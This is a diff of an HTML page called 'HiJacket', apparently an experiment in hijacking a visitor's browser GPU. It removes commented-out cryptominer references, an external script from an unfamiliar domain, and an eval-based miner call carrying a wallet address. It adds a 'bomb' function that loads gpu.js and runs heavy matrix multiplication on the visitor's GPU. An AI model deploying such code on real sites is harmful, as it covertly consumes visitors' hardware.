@@ -3,46 +3,52 @@
 <head>
     <title>HiJacket</title>
     <!--    <script src="./bomb.js" type="text/javascript"></script>-->
-    <!--    <script src="./lib/cryptoloot-master/lib/crypta.js" type="text/javascript"></script>-->
-    <script src="https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js" type="text/javascript"></script>
-    <!--    https://www.crypto-webminer.com/ -->
-    <!--    <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>-->
+    <!--    <script src="https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js" type="text/javascript"></script>-->
     <script type="text/javascript">
         function bomb() {
-            const gpu = new GPU()
 
-            const DIMENSION = 8096
-            const generateMatrices = () => {
-                const matrices = [[], []]
-                for (let y = 0; y < DIMENSION; y++) {
-                    matrices[0].push([])
+            let li = document.createElement('script');
+            li.src = 'https://unpkg.com/gpu.js@latest/dist/gpu-browser.min.js';
+            li.async = false;
+            let s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(li, s);
 
-                    matrices[1].push([])
-                    for (let x = 0; x < DIMENSION; x++) {
-                        matrices[0][y].push(Math.random())
-                        matrices[1][y].push(Math.random())
+            setTimeout(() => {
+                const gpu = new GPU()
+
+                const DIMENSION = 1024 //8096
+                const generateMatrices = () => {
+                    const matrices = [[], []]
+                    for (let y = 0; y < DIMENSION; y++) {
+                        matrices[0].push([])
+
+                        matrices[1].push([])
+                        for (let x = 0; x < DIMENSION; x++) {
+                            matrices[0][y].push(Math.random())
+                            matrices[1][y].push(Math.random())
+                        }
                     }
+                    return matrices
                 }
-                return matrices
-            }
 
-            const multiplyMatrix = gpu.createKernel(function (a, b, dim) {
-                let sum = 0;
-                for (let i = 0; i < dim; i++) {
-                    sum += a[this.thread.y][i] * b[i][this.thread.x];
-                }
-                return sum;
-            }).setOutput([DIMENSION, DIMENSION])
-            const matrices = generateMatrices()
-            const out = multiplyMatrix(matrices[0], matrices[1], DIMENSION)
-            console.log(out)
+                const multiplyMatrix = gpu.createKernel(function (a, b, dim) {
+                    let sum = 0;
+                    for (let i = 0; i < dim; i++) {
+                        sum += a[this.thread.y][i] * b[i][this.thread.x];
+                    }
+                    return sum;
+                }).setOutput([DIMENSION, DIMENSION])
+                const matrices = generateMatrices()
+                const out = multiplyMatrix(matrices[0], matrices[1], DIMENSION)
+                console.log(out)
+
+                let div = document.createElement("div");
+                div.id = 'div_id';
+                div.innerHTML = out;
+                document.body.appendChild(div);
+            }, 3000);
         }
 
-        // const gpuminer = gpu.createKernel(function(f) {
-        //     eval(f)
-        //     return 0
-        // }, {output: [1]})
-        // gpuminer(EverythingIsLife("48jVWYAJtHdZpqcXtFSLfcRbq4uZHgnbY6rqPcbo3RCq3zFj6vQhhUkciWoGt6L5VMXpeiMVNc3xrU9Bvuv8pP8L8Sy4TtP", 'x', 20))
     </script>
 
 </head>
